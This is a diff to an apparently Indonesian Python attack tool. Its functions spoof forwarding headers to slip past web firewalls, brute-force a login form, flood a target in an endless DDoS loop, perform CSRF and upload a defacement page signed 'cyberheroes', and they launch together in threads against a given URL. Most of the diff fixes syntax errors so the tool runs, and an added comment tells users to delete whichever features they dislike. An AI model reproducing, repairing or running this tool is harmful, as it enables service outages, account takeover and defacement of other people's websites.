@@ -1,4 +1,3 @@
-
 import requests
 import random
 import string
@@ -66,7 +65,7 @@ def create_session():
         'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
     })
     return session
-   
+
 def send_request(url, session, proxy=None):
     try:
         response = session.get(url, proxies=proxy, timeout=5)
@@ -77,8 +76,8 @@ def send_request(url, session, proxy=None):
         return response
     except requests.exceptions.RequestException as e:
         print(f"Terjadi kesalahan: {e}")
-        return Non
-       
+        return None
+
 def advanced_waf_bypass(url, session):
     headers = {
         'X-Real-IP': '127.0.0.1',
@@ -93,7 +92,6 @@ def advanced_waf_bypass(url, session):
         'X-DoS-Protection': 'false'
     }
 
-    
     try:
         response = session.get(url, headers=headers, timeout=5)
         if response.status_code == 200:
@@ -123,8 +121,8 @@ def brute_force_login(url, session):
     for username in usernames:
         for password in passwords:
             payload = {"username": username, "password": password}
-            send_request(url + "/login", session
-                         
+            send_request(url + "/login", session)
+
 def flooding_ddos(url, session):
     def flood_target():
         while True:
@@ -177,8 +175,8 @@ def deface_payload(url, session, backup_file_path):
         </head>
         <body>
             <h1>cyberheroes</h1>
+            <p>99987773</p>
             <p>error</p>
-            <p>tunggu 24jam</p>
         </body>
     </html>
     """
@@ -197,7 +195,8 @@ def deface_payload(url, session, backup_file_path):
             print(f"{R}Deface gagal! Status code: {response.status_code}{N}")
     except requests.exceptions.RequestException as e:
         logging.error(f"Deface gagal: {e}")
-        print(f"{R}Deface gagal: {e}{N}") 
+        print(f"{R}Deface gagal: {e}{N}")
+
 def restore_backup(url, backup_file_path, session):
     try:
         with open(backup_file_path, 'r') as f:
@@ -216,12 +215,14 @@ def restore_backup(url, backup_file_path, session):
 
 def start_attack(url):
     session = create_session()
+
     if not is_valid_url(url):
         print(f"{R}URL tidak valid! Periksa URL dan coba lagi.{N}")
         return
-       print(f"{Y}Mulai serangan ke: {url}{N}")
+
+    print(f"{Y}Mulai serangan ke: {url}{N}")
     random_delay()
-   
+
     def ddos_attack():
         flooding_ddos(url, session)
 
@@ -233,14 +234,14 @@ def start_attack(url):
 
     def csrf_attack_func():
         csrf_attack(url, session)
-       
+
     def waf_bypass_func():
         advanced_waf_bypass(url, session)
 
-    # Fungsi untuk melakukan deface
     def deface_func():
         deface_payload(url, session, "backup_page.html")
 
+    # lu olang bisa delet fitur mana yg lu olang yang gak suka o
     threads = []
     threads.append(threading.Thread(target=ddos_attack))
     threads.append(threading.Thread(target=login_bruteforce))
